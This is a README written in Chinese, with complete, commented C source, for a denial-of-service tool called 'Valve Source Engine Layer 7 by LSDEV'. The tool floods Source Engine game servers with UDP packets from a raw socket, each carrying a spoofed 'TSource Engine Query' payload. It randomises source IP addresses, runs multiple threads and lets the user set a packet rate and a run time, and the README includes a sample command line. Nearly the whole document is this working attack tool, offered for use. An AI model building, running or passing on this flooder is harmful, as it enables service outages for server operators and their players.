# Valve Source Engine Layer 7 洪水攻击工具

## 原理
该程序的主要功能是对基于 Valve Source 引擎的服务器发起 Layer 7 洪水攻击。Layer 7（应用层）攻击通过模拟合法的应用层请求，向目标服务器发送大量伪造的 UDP 数据包，耗尽服务器的资源。每个 UDP 包包含特定的查询字符串 `Source Engine Query`，模拟对游戏服务器的查询行为，从而占用服务器带宽、CPU 等资源，导致服务中断。

该工具通过原始套接字发送伪造的数据包，伪造的包头包括随机化的源 IP 地址和源端口。程序可以多线程运行，允许同时启动多个线程以提高攻击效率，并且具有每秒发送包数量（PPS）限制功能，用户可以根据需要调整攻击强度。

## 目标功能
- **动态源 IP 地址**：每个发送的 UDP 包具有随机化的源 IP 地址和源端口，使得攻击更难以防御。
- **高效多线程攻击**：支持用户自定义线程数，使用多个并发线程加快攻击速度。
- **PPS 速率控制**：允许用户设置每秒发送的包数量限制，以调整攻击强度。如果设置为 `-1` 则没有速率限制。
- **攻击持续时间控制**：用户可以指定攻击的持续时间，程序在设定的时间后自动停止。
- **源查询伪造**：每个 UDP 包携带一个模拟的 Source 引擎查询数据包，使服务器误以为这是正常的客户端查询请求。

## 使用方法

在终端中执行此程序时，需要提供以下四个参数：

./program_name <目标IP> <线程数> <PPS限制> <持续时间>


- `<目标IP>`：目标服务器的 IP 地址（例如 `192.168.0.1`）。
- `<线程数>`：并发线程的数量，表示并行发起攻击的线程数。
- `<PPS限制>`：每秒发送的包数量上限，设置为 `-1` 表示没有限制。
- `<持续时间>`：攻击的持续时间，单位为秒。

### 示例
```bash
./flood 192.168.0.1 10 5000 60
```
-该命令会对 IP 为 192.168.0.1 的服务器发起攻击，使用 10 个线程，并限制每秒发送 5000 个数据包，攻击持续时间为 60 秒。

```c
/*
 * Valve Source Engine Layer 7 by LSDEV
 *
 * 该程序用于执行Layer 7（应用层）的洪水攻击，目标是Valve Source引擎的服务器。
 */

#include <pthread.h>           // 多线程库
#include <unistd.h>            // POSIX标准库，包含sleep函数
#include <stdio.h>             // 标准输入输出库
#include <stdlib.h>            // 标准库函数，如malloc、exit等
#include <string.h>            // 字符串处理函数库
#include <sys/socket.h>        // 套接字库，包含socket函数
#include <netinet/ip.h>        // IP协议定义
#include <netinet/udp.h>       // UDP协议定义

#define MAX_PACKET_SIZE 4096   // 定义最大数据包大小为4096字节
#define PHI 0x9e3779b9         // 常量PHI，用于随机数生成算法

 // 定义全局变量
static unsigned long int Q[4096], c = 362436;  // 4096个元素的随机数队列和初始状态变量c
static unsigned int floodport;                // 洪水攻击的目标端口
volatile int limiter;                         // 限制发送速率
volatile unsigned int pps;                    // 每秒数据包发送数量计数器
volatile unsigned int sleeptime = 100;        // 线程休眠时间，初始为100微秒

// 初始化随机数生成器的种子
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;                                 // 种子值
    Q[1] = x + PHI;                           // 第二个值基于PHI
    Q[2] = x + PHI + PHI;                     // 第三个值基于PHI
    for (i = 3; i < 4096; i++) {              // 生成后续的4096个伪随机数
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; // 基于前面生成的数和PHI值计算
    }
}

// 随机数生成函数 (CMWC - Complementary Multiply with Carry)
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;    // 定义乘数a和64位临时变量t
    static unsigned long int i = 4095;        // 用于索引随机数队列的索引
    unsigned long int x, r = 0xfffffffe;      // x用于存储计算结果，r是最大值
    i = (i + 1) & 4095;                       // 环形索引i，自增并保持在4096范围内
    t = a * Q[i] + c;                         // 计算t = a * Q[i] + c
    c = (t >> 32);                            // 更新状态变量c为高32位的值
    x = t + c;                                // x为t + c的和
    if (x < c) {                              // 如果x小于c，修正x和c
        x++;
        c++;
    }
    return (Q[i] = r - x);                    // 返回新生成的随机数并存储到Q[i]
}

// 校验和计算函数，用于生成IP头部的校验和
unsigned short csum(unsigned short* buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1) {                       // 遍历缓冲区，每次处理2个字节
        sum += *buf++;                        // 将每个16位值累加到sum
        count -= 2;
    }
    if (count > 0) {                          // 如果有剩余的1个字节，处理它
        sum += *(unsigned char*)buf;
    }
    while (sum >> 16) {                       // 将高16位加到低16位，确保sum在16位范围内
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);            // 返回计算出的校验和
}

// 设置IP头部
void setup_ip_header(struct iphdr* iph)
{
    iph->ihl = 5;                             // IP头部长度，5表示20字节
    iph->version = 4;                         // IP版本为IPv4
    iph->tos = 0;                             // 服务类型字段，设为0
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;  // 总长度，包含IP和UDP头部及数据
    iph->id = htonl(54321);                   // IP包标识符，设置为54321
    iph->frag_off = 0;                        // 不分片
    iph->ttl = MAXTTL;                        // 生存时间（TTL）设为最大值
    iph->protocol = IPPROTO_UDP;              // 协议类型为UDP
    iph->check = 0;                           // 校验和初始为0，后续计算
    iph->saddr = inet_addr("192.168.3.100");  // 源地址设为192.168.3.100
}

// 设置UDP头部
void setup_udp_header(struct udphdr* udph)
{
    udph->source = htons(27015);              // 源端口设置为27015
    udph->dest = htons(27015);                // 目的端口设置为27015
    udph->check = 0;                          // 校验和设为0（UDP头的校验和可选）
    void* data = (void*)udph + sizeof(struct udphdr);  // 指向数据部分
    memset(data, 0xFF, 4);                    // 前4字节填充0xFF
    strcpy(data + 4, "TSource Engine Query");   // 填充特定的字符串"Source Engine Query"
    udph->len = htons(sizeof(struct udphdr) + 25);  // 设置UDP数据包的长度
}

// 数据包发送的线程函数
void* flood(void* par1)
{
    char* td = (char*)par1;                  // 提取目标IP地址参数
    char datagram[MAX_PACKET_SIZE];           // 定义用于发送的伪造数据包
    struct iphdr* iph = (struct iphdr*)datagram;  // 将数据包的起始部分解释为IP头
    struct udphdr* udph = (void*)iph + sizeof(struct iphdr);  // IP头之后为UDP头

    struct sockaddr_in sin;                   // 目的地址结构体
    sin.sin_family = AF_INET;                 // 设置为IPv4
    sin.sin_port = htons(17015);              // 设置目的端口17015
    sin.sin_addr.s_addr = inet_addr(td);      // 将目标IP地址转换为二进制并设置

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);  // 创建一个原始套接字用于发送UDP包
    if (s < 0) {                              // 如果创建套接字失败，输出错误信息并退出
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);     // 清空数据包缓冲区
    setup_ip_header(iph);                     // 设置IP头部
    setup_udp_header(udph);                   // 设置UDP头部

    iph->daddr = sin.sin_addr.s_addr;         // 设置IP头的目标地址
    iph->check = csum((unsigned short*)datagram, iph->tot_len);  // 计算并设置IP头的校验和

    int tmp = 1;
    const int* val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {  // 设置套接字选项，手动构建IP头
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));                    // 初始化随机数生成器
    register unsigned int i;
    i = 0;
    while (1) {                                 // 无限循环，持续执行洪水攻击
        sendto(s, datagram, iph->tot_len, 0,   // 发送伪造的数据包到目标地址
            (struct sockaddr*)&sin, sizeof(sin));

        // 动态随机生成新的源IP地址
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 |
            (rand_cmwc() >> 16 & 0xFF) << 16 |
            (rand_cmwc() >> 8 & 0xFF) << 8 |
            (rand_cmwc() & 0xFF);

        // 动态生成新的IP标识符
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

        // 重新计算IP头的校验和
        iph->check = csum((unsigned short*)datagram, iph->tot_len);

        pps++;                                 // 增加每秒发送的数据包计数器

        if (i >= limiter) {                     // 如果达到发送限制
            i = 0;                             // 重置计数器
            usleep(sleeptime);                 // 根据设置的休眠时间暂停
        }

        i++;                                   // 增加当前循环的计数
    }
}

int main(int argc, char* argv[]) {
    // 检查传入的参数数量是否少于5个
    if (argc < 5) {
        // 如果参数数量不足，输出错误信息并提示正确的使用方法
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Valve Source Engine Layer 7 by LSDEV\nUsage: %s <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        // 退出程序，返回错误代码 -1
        exit(-1);
    }

    // 提示正在设置套接字
    fprintf(stdout, "Setting up Sockets...\n");

    // 从命令行参数中获取线程数量并将其转换为整数
    int num_threads = atoi(argv[2]);
    // 从命令行参数中获取每秒包数量（pps）的限制并将其转换为整数
    int maxpps = atoi(argv[3]);

    // 初始化全局变量
    limiter = 0;  // 用于控制数据包发送速率的限制器
    pps = 0;      // 每秒发送数据包的计数器

    // 创建一个线程数组，用于存储要启动的线程
    pthread_t thread[num_threads];

    // 设置一个倍数，用于计时器来调整攻击的持续时间
    int multiplier = 20;

    // 通过循环创建指定数量的线程
    int i;
    for (i = 0; i < num_threads; i++) {
        // 创建每个线程，并传入目标IP作为参数，线程将执行flood函数
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
    }

    // 提示攻击已开始
    fprintf(stdout, "Starting Flood...\n");

    // 计算持续攻击的时间，并以倍数调整
    for (i = 0; i < (atoi(argv[4]) * multiplier); i++) {
        // 每隔一段时间休眠，控制时间间隔
        usleep((1000 / multiplier) * 1000);

        // 检查当前的发送速率是否超过了设置的最大pps
        if ((pps * multiplier) > maxpps) {
            // 如果当前速率超出限制
            if (1 > limiter) {
                // 增加休眠时间，减缓发送速率
                sleeptime += 100;
            }
            else {
                // 否则减少限制器值，保持较高的速率
                limiter--;
            }
        }
        else {
            // 如果当前速率低于限制
            limiter++;  // 增加限制器值，加快发送速率

            // 如果当前的休眠时间超过25微秒，减小休眠时间
            if (sleeptime > 25) {
                sleeptime -= 25;
            }
            else {
                // 否则将休眠时间设置为0，保持最大速率
                sleeptime = 0;
            }
        }

        // 每秒重置数据包计数器
        pps = 0;
    }

    // 程序结束，返回0表示成功退出
    return 0;
}

```
